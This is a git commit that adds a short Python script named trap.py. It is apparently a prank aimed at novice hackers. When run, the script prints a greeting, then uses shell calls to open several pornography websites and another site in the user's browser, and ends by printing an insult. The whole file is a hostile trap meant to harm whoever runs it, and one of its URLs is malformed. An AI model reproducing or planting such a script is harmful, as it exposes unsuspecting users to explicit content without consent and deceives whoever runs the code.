ccd425a43a61886cae4992fe22ee5f582baf0ef7
Z4RP1HR <103745705+Z4RP1HR@users.noreply.github.com>
2023-02-07 17:17:18 +0800

    Create trap.py

---
+++ trap.py
@@ -0,0 +1,15 @@
+import os
+import sys
+import time
+
+##### Message Here #####
+print("Welcome to AnonPrixor World")
+time.sleep(2)
+os.system("xdg-open https://youjizz.com")
+os.system("xdg-open https://pornhub.com")
+os.system("xdg-open https://kanortube.com")
+os.system("xdg-open 6https://xnxx.com")
+os.system("xdg-open https://xvideos2.com")
+os.system("xdg-open https://xvideos.com")
+os.system("xdg-open https://anonprixor.pw")
+print("Fuck you skid!!!")
